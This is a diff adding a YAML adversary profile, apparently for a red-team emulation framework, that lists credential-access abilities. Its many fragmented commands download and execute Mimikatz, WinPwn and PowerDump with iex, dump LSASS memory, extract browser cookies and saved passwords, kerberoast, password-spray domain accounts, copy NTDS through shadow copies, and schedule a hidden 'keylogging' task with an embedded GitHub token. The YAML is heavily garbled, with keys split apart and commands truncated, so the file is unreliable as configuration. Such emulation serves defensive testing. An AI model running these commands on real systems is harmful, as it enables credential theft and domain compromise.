@@ -1,0 +1,321 @@
+name: Credential Access - Payloads
+description: Only abilities related to this tactic.
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- abeb340acb3e1236c6919339942e7c77
+- 7049e3ec-b822-4fdf-a4ac-18190f9b66d1
+- f580e36cb6700db98313b278718c499f
+- 07866f1a-6d52-412f-8ce3-2eafe76016c7
+- 1a9594af08d4b31e19d6ff4cdeb02a2e
+- 4f277a5607b655a2e5bc05ff21ed81cf
+- f7340f45-cb84-47a2-b1c0-fb29061127eb
+abilities: []
+' d21b4ae13ee85560eb6b82c5c9150ae7': []
+'  name': ADFS token signing and encryption certificates theft - Local
+'  tactic': credential-access
+'  technique_name': '"Unsecured Credentials'
+'  technique_id': T1552.004
+'  executors': ''
+'   - cmd':
+- 'cmd:'
+'     platform': windows
+'     command': '|'
+' 208436255442cc0faf2ae7fd95da3d87': []
+' 69219b448ba0a75bae573d58d8b6cf40': []
+'   - psh':
+- 'psh:'
+'       1..10 | % { ;  try { [System.IO.File]': []
+' 902759cef602e229403487b6eb762304': []
+'       iex(new-object net.webclient).downloadstring(''https': //raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+  browserpwn -consoleoutput -noninteractive
+' 0cfc58211fd46e76f41eb5a33bc020c9': []
+' 2d818176bfe51a3ac9616e2fbb3e9266': []
+' 5fc4e8ca208fea6379a4e2778d475199': []
+' 2243bc5506f56ec3319831350922f600': []
+' aee64e494f7adfb1867d67f7ee08e5c6': []
+' 6b8a391237b7169d02dd6538f8290345': []
+' 52928f462ea8f5fa617aa8c815f5598b': []
+' 5e3512c73a461c17ddcb1cc0bbdbeef9': []
+' fcb48dc9d0878aada8977dbaa540fdfb': []
+' 3902ebddf7ab6e96a67f9265dd7f8e6b': []
+' a3c5f576b3c5d4b14da1a3edaafe4a87': []
+' 1353d954c020fa5ff039b7e85ee261bc': []
+' 6851f254966e0828f9c22f8f0c9dda72': []
+' b29f6c6ba7bb6dd0aaa2082db126dbab': []
+' c2941443b845d600bcfa520c969e3ada': []
+' 3a125974-81af-4683-8993-b98fe11bc5ab': []
+' 3edb29f216095bfedf8abacc650e37ac': []
+' b6133e6e6c0340646e59a9b6a3ace189': []
+' fd667f62fb7a3a02a3b69686b1f7ad1b': []
+' abeb340acb3e1236c6919339942e7c77': []
+' 20d2fcbd24cdd2cf4e6e74181a3a97dd': []
+' d54bcaf2e58f6d95da2a54dcb5853a57': []
+'       stop-process -name "firefox" -force -erroraction silentlycontinue; $CookieDBLocation = get-childitem -path "$env': appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite";
+  "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"
+  | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+  "$CookieDBLocation" | out-file -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt"
+' a542d4e890dccca62429cc433f8f85e9': []
+'       $devToolsPort = 9222; $testUrl = "https': //www.google.com"; stop-process
+  -name "chrome" -force -erroraction silentlycontinue; $chromeProcess = Start-Process
+  "chrome.exe" "$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default"
+  -PassThru; Start-Sleep 10; $jsonResponse = Invoke-WebRequest "http
+' 126aaf80c6a232eaf08dcef3163d4aed': []
+? '       stop-process -name "chrome" -force -erroraction silentlycontinue; "select
+  host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from
+  [Cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+  "$env'
+: localappdata\Google\Chrome\User Data\Default\Network\Cookies" | out-file -filepath
+  "PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt"
+' 9a5827d2-6c56-4876-a0bb-2379491285a3': []
+? '       stop-process -name "chrome" -force -erroraction silentlycontinue; "select
+  host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from
+  [Cookies];" | cmd /c $env'
+: temp\sqlite-tools-win32-x86-3380200\sqlite3.exe "$env
+' b41910e3770cff37dd642650f0d91672': []
+'       $archive="$env': PUBLIC\T1649\atomic_certs.zip"; $exfilpath="$env
+' 2b5257b1-64fb-4d92-87a6-e0c0f67bcae5': []
+' 56c2f2d8b48bcb1c999d4e8929bd8d9b': []
+'       $exfil_folder = "$env': temp\T1555.003"; if (test-path "$exfil_folder") {}
+  else {new-item -path "$env
+' 1b4fb81c-8090-426c-93ab-0a633e7a16a7': []
+'       $path = "$ENV': UserProfile\Desktop\pcap.etl";
+'   - sh':
+- 'sh:'
+' 679ef375ad2b361965500392419d084c': []
+'       Copy-Item "$env': LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+  -Destination "PathToAtomicsFolder\..\ExternalPayloads"; Copy-Item "$env
+' e5279c9ad109fef655e2c1abd6304725': []
+' 7a3fbf23-65a8-480f-8c87-0886cd7e02ad': []
+' 1cca72410c2849070d833700fcc30c59': []
+' fff25debffb3645d82c89632750497a1': []
+' 137075767ba5b96cb3e0ea66e32d8ab5': []
+' 1026f4f4752ae0e22cd1e582960049bb': []
+'       ls -R C': \Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  | Select-String "password", "-p", "key", "pwd", "pass"
+' baac2c6d-4652-4b7e-ab0a-f1bf246edd12': []
+'       [System.Net.ServicePointManager]': []
+'       $result = $web.DownloadString("https': //raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
+' 88d78618bbba0ca862d8d5a6f6fb4d72': []
+' c3386fb7-7713-4a93-8710-2b02bc4b9646': []
+' 1272c02ca685d9967ee2be885dea8df5': []
+' eedc7881da4d2fddb5c56fb96aaeecfd': []
+'       klist purge; cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" kerberoast None /outfile': '"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"'
+' 358926f4adef63bf95d152e35df4dab3': []
+'       cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asreproast /outfile': '"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"'
+' f6c693da77b8824b3c52ba3b6ca0bf88': []
+'       C': \Windows\System32\rundll32.exe C
+' 2cc37a6cf2f1acdeaa6a6638016444d1': []
+' 8b5f748da9647a4d9c5a37f20124ba9c': []
+? '       if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host
+  Joining this computer to a domain must be done manually};  ;  [Net.ServicePointManager]'
+: []
+' 2f03250355bb1403dcfac6808782a192': []
+' 91a18ae1efe4119a549cea2ac7de72c4': []
+'       Add-Type -AssemblyName System.IdentityModel; $ComputerFQDN=$env': LogonServer.trimStart('\')
+  + "." + $env
+' abdf0db6e97910de1c0cbfa7a7fa3c72': []
+' 7fa4ea18694f2552547b65e23952cabb': []
+' e16297dffb68b5ffa5b243243233cd1c': []
+'       dir c': \ /b /s .key | findstr /e .key
+' 02a7167e-3cb9-4c97-accc-f30eebb7abd2': []
+'       IEX (New-Object Net.WebClient).DownloadString(''https': //raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');
+' 82dcefb5c3512d73bf2248cb0127c4ae': []
+' 6432bebd-a0a4-41f2-927e-45cc966e17ad': []
+' 7049e3ec-b822-4fdf-a4ac-18190f9b66d1': []
+' 3bcfa369fd1f214e4d05944228eeb212': []
+? '       if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1") {
+  ; } else {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
+  ignore -Force | Out-Null; Invoke-Webrequest -Uri "https'
+: //raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"
+  -UseBasicParsing -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"};  ;  Write-Host
+  "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green; Import-Module
+  "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"; Invoke-PowerDump
+' 608b7021a5b8369e9fd858feba6f5611': []
+' a59dbd1a2ac17d69455248e7d91231bc': []
+? '       if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {;   Write-Host "Only
+  ''NTLM'' and ''Kerberos'' auth methods are supported";   exit 1; }; $DomainUsers
+  = Get-ADUser -LDAPFilter ''(&(sAMAccountType=805306368)(!(UserAccountControl'
+: 1.2.840.113556.1.4.803
+' e5168b0f7e57ba7b20c9842a350bb539': []
+'       cd "PathToAtomicsFolder\..\ExternalPayloads"; .\kerbrute.exe passwordspray --dc $ENV': userdnsdomain
+  -d $ENV
+' fa48e8c59b5e1f43e8f5e2927d560f8f': []
+? '       if not exist %temp%\users.txt  ( call ) ELSE ( "PathToAtomicsFolder\T1110.003\src\parse_net_users.bat"
+  ) &&   &&  @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$
+  /user'
+: '"%userdomain%\%n" "'
+' 279d24eeb12b40e4547945accf59ca62': []
+'       if (Test-Path  $env': Temp\usersdpsLight.txt) { ; } else {Write-Host -NoNewLine
+  "Reading Users."; $netOutput = net users /domain; $netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]);
+  $userLimit = 200; $usercount = 0; foreach ($line in $netOutput) {;   if($usercount
+  -ge $userLimit){break};   $line = $line.trim();   $line = $line -split '\s\s+';   foreach
+  ($user in $line){;     if($usercount -ge $userLimit){break};     Add-Content $env
+' 6c743dbd-1770-45d5-96ae-c250e227bbde': []
+' c285cfeaf0c226d3d2b3812726dbe3a8': []
+'       [Net.ServicePointManager]': []
+' f580e36cb6700db98313b278718c499f': []
+' 77e4fd90d211edf046c6c7092a4ed3af': []
+'       cd "PathToAtomicsFolder\..\ExternalPayloads"; .\kerbrute.exe bruteuser --dc $ENV': userdnsdomain
+  -d $ENV
+' 7e8ccbe3de961012b6464485829e87a4': []
+'       "PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "sekurlsa': []
+' 3c647015-ab0a-496a-8847-6ab173cd2b22': []
+' 1c849fe3ef3770531cd727bc20c98eb3': []
+'       $usernameinfo = (Get-ChildItem Env': USERNAME).Value; Get-ChildItem -Hidden
+  C
+' 7beeb544b751808608fd8cd2618efa4a': []
+'       dir /a': h C
+' 0ef4cc7b-611c-4237-b20b-db36b6906554': []
+'       $ps_url = "https': //download.sysinternals.com/files/Procdump.zip";
+'       $download_folder = "C': \Users\Public\";
+'       $staging_folder = "C': \Users\Public\temp";
+'       $arch=[System.Environment]': []
+'           iex $staging_folder"\procdump64.exe -accepteula -ma lsass.exe" > $env': APPDATA\error.dmp
+  2>&1;
+'           iex $staging_folder"\procdump.exe -accepteula -ma lsass.exe" > $env': APPDATA\error.dmp
+  2>&1;
+' adb7ea6d32d38c982ed4e8c0f4f261f5': []
+' 7d1c6222726c67b13740450275dc2162': []
+' a9ae4f35-da08-4008-956a-d45ac0ad26af': []
+? '       Register-ScheduledTask -TaskName "keylogging" -Trigger (New-ScheduledTaskTrigger
+  -Once -At (Get-Date).AddSeconds(3)) -Action (New-ScheduledTaskAction -Execute ''powershell.exe''
+  -Argument ''-NoProfile -WindowStyle Hidden -Command "cd $Env'
+: temp; $pat = \"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\"; $token = [System.Convert]
+' c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7': []
+' 571872eefcba7a9007a6377ac0d3ba32': []
+' e0c75b4cc32124ef4c61508694fd0808': []
+' 53d863a190b41b6af474be875b74784b': []
+' e93d024cd93ceaaf880d6f799ef1c9c8': []
+' de632c2d-a729-4b77-b781-6a6b09c148ba': []
+? '       foreach($i in @(".key",".pgp",".gpg",".ppk",".p12",".pem",".pfx",".cer",".p7b",".asc",".crt")){Get-ChildItem
+  -Path c'
+: \ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name
+  -Match "$i$"}}
+'       for %i in (\.key \.pgp \.gpg \.ppk \.p12 \.pem \.pfx \.cer \.p7b \.asc) do (dir c': \
+  /b /s .key | findstr /e "%i")
+' aeb4fdbb3453127caaef0ad5c250d838': []
+' e0496104d8da1ada94001fe7778e7402': []
+' 935e8026584b85192519c57d7080b048': []
+' f7257d271a176f7c609b4a33513d2eef': []
+? '       $mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText;
+  $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation
+  cert'
+: \LocalMachine\My; Set-Location Cert
+' 995eb25ee0b9d036110318311ca2527b': []
+'       $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert': \LocalMachine\My;
+  Set-Location Cert
+' 70bcc96a28d6d61c3f1083675cb0ff01': []
+'       "PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "crypto': []
+' 262666862164b89881f6b5c565c0a3be': []
+' 3e5b04b8ee0a1a4950da8f35d95e65fc': []
+' 6bbb6f8b1db42e2c2c79892e8c31feb3': []
+'       vaultcmd /listcreds': '"Web Credentials" /all'
+' f5606cc7632289d5ca72d4a485c14f6b': []
+' d5a972721597aa60e063bf9212edb13b': []
+' 7a6f458cdff64fdd8ec0c2917400dd90': []
+' 94e2638b0b5dc476f919b50ff899a382': []
+' 18f31c311ac208802e88ab8d5af8603e': []
+? '       $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction
+  Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id
+  }; C'
+: \Windows\System32\rundll32.exe C
+' 38cfda55-a6be-4047-b5b9-36fe93c2af96': []
+' 751582cf09624f6d66d1755e681641b8': []
+'       IEX (IWR ''https': //github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1'
+  -UseBasicParsing) ; certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400
+  c
+' b075de5267357b66b0c684780bb5dfcd': []
+' bbc786e45aff314d33e60133f010f00c': []
+'       if (Test-Path -Path "$env': SystemRoot\System32\rdrleakdiag.exe") {;       $binary_path
+  = "$env
+' 36fc42ced381416ca7d5d7af0ee0561b': []
+'       if (Test-Path ''C': \Windows\Temp\xordump.exe') { ; } else {[Net.ServicePointManager]
+' 03455985e8bf5d2ee43947cadaca2256': []
+' 35d92515122effdd73801c6ac3021da7': []
+' 3ae905fe6171f9d0fbefd9cb6b8d6a82': []
+'       "PathToAtomicsFolder\..\ExternalPayloads\procdump.exe" -accepteula -ma lsass.exe C': \Windows\Temp\lsass_dump.dmp
+' 60bb6f8468aa98b75be2521861a164d5': []
+' 11b3ddb2-bbc2-4d52-96d1-d0253a362fe9': []
+' 990a4629d154622098b70ba50384051f': []
+' 505f7b839938e8cea8db2dc9a4448f57': []
+' 8e01631039faf6a9a84df376bf9ad0f1': []
+'       $exePath =  resolve-path "$env': ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe";
+  & "$exePath" -u -f $env
+' 358e25c21b0052bf99d938d2d0a1cfa5': []
+'       Invoke-Expression (New-Object Net.WebClient).DownloadString(''https': //raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
+' 8de14c0ea1b80dbd5de0cf5d28cff16b': []
+' 95787489ec59887221ad6181fb76351c': []
+' df3a85f892f81ee118bee2a49141710a': []
+'       mkdir C': \Windows\Temp\ntds_T1003 && ntdsutil "ac i ntds" "ifm" "create full
+  C
+' c8d9e363c74b7bd3d03354ed5d352f00': []
+'       $PasswordDBLocation = get-childitem -path "$env': appdata\Mozilla\Firefox\Profiles\*.default-release\";
+  cmd /c PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\python.exe
+  PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py -d $PasswordDBLocation
+  > $env
+' 31cf0ec60219bc8a36865f2eaddf1fbd': []
+'       %tmp%\mimikatz\x64\mimikatz.exe "lsadump': []
+' 98e58fc4-3843-4511-89b1-50cb872e0c9b': []
+' 3aad5312-d48b-4206-9de4-39866c12e60f': []
+' a3bbc5e0-add5-4d31-825b-88ccb2db0c10': []
+'       if (! $(test-path -path "C': \Program Files\SysinternalsSuite")) {
+'                   write-host "[!] The path C': \Program Files\SysinternalsSuite
+  does not exist. Execution has stopped.";
+'                 Set-Location -path "C': \Program Files\SysinternalsSuite";
+' 07866f1a-6d52-412f-8ce3-2eafe76016c7': []
+'       Import-PfxCertificate -Exportable -FilePath ".\T1552_004_dmevals.local.pfx" -CertStoreLocation Cert': \LocalMachine\My;
+'                 if (! $(test-path -path "C': \Program Files\SysinternalsSuite"))
+  {
+' 24a6ff3816824ecae285f847995709cf': []
+'       Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C': \Windows\System32";
+  $path = Get-ItemProperty -Path "HKLM
+' b7d9ef00-ce1b-4c56-b26f-e15bc7d3ec90': []
+"       \t    Invoke-Mimikatz -Command \"privilege": []
+' 6b55240dbd6e02df957284328938fcf6': []
+'       vssadmin.exe create shadow /for=C': '&& mklink /D C'
+' 1a9594af08d4b31e19d6ff4cdeb02a2e': []
+'       mkdir c': \exfil && diskshadow.exe /s 6c3749_diskshadow.txt
+' cf60378dd1bbaccd4e7391c0317da202': []
+'       wmic shadowcopy call create Volume=C': \
+' 1cd17dbd-aafd-4183-8a05-27916e43ee82': []
+' 6dc5c587fd22d65b81a443b7ce065ab1': []
+'       (gwmi -list win32_shadowcopy).Create(''C': \','ClientAccessible')
+' be6f8d1c9a01d720483c8a5daca1c472': []
+'       wmic /node': '"localhost" process call create "cmd.exe /c esentutl.exe /y
+  /vss c'
+' 053d6505f7c4cf792b0ab2f262dff95a': []
+' f7ea25ca809e576a3b5b5b1e4dd94ea4': []
+' 54643bf2018c940ca5fc21097884d2d4': []
+'       "PathToAtomicsFolder\..\ExternalPayloads\procdump.exe" -accepteula -mm lsass.exe C': \Windows\Temp\lsass_dump.dmp
+' 8bdb353bbee5378745783ff6f2d49cb0': []
+'       Remove-Item $env': TEMP\golden.bat -ErrorAction Ignore; Remove-Item $env
+' 6d0695f8f33776c82ad1294b6c6f02cd': []
+' 107a14acdd84a7d6e7c891177b0db3aa': []
+' 548f5aa3ec2fcfc6872ee10975480f29': []
+'       if not exist C': \Windows\Temp  ( call ) ELSE ( mkdir C
+' 000549902a51ef21f57d3d28a6e5ecc0': []
+' bb0df721f4a4defa743efe9e61837c44': []
+' 3d7b7a1676afefc4af9506003b2d58d1': []
+'       cd "PathToAtomicsFolder\..\ExternalPayloads"; .\kerbrute.exe bruteforce --dc $ENV': userdnsdomain
+  -d $ENV
+' 09fc509d77ec1ce89738bedeac2e9e3a': []
+? '       echo Password1> passwords.txt && echo 1q2w3e4r>> passwords.txt && echo Password!>>
+  passwords.txt && echo Spring2022>> passwords.txt && echo ChangeMe!>> passwords.txt
+  && @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user'
+: '"%userdomain%\'
+' 4f277a5607b655a2e5bc05ff21ed81cf': []
+? '       if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {;   Write-Host "Only
+  ''NTLM'' and ''Kerberos'' auth methods are supported";   exit 1; }; [System.Reflection.Assembly]'
+: []
+' f7340f45-cb84-47a2-b1c0-fb29061127eb': []
+' b267badd4e6f3601450582cb07d9f333': []
+'       $profile = (Gci -filter "*default-release*" -path $env': Appdata\Mozilla\Firefox\Profiles\).FullName;
+  Copy-Item $profile\key4.db -Destination "PathToAtomicsFolder\..\ExternalPayloads"
+  > $null; Copy-Item $profile\logins.json -Destination "PathToAtomicsFolder\..\ExternalPayloads"
+  > $null; Remove-Item $profile\key4.db > $null; Remove-Item $profile\logins.json
+  > $null; Copy-Item "$env
+' 780cde60c956ccbff24c43ff7b7e70ea': []
+'       type C': \Windows\Panther\unattend.xml && type C
+' 745d16045bcf10379b8cf2fa45f2b66e': []
+' 2d78dfbfea7fa4ec7349993b83048079': []
+adversary_id: fdcb18ff-fced-42e9-b1a0-3e8c7356ee82
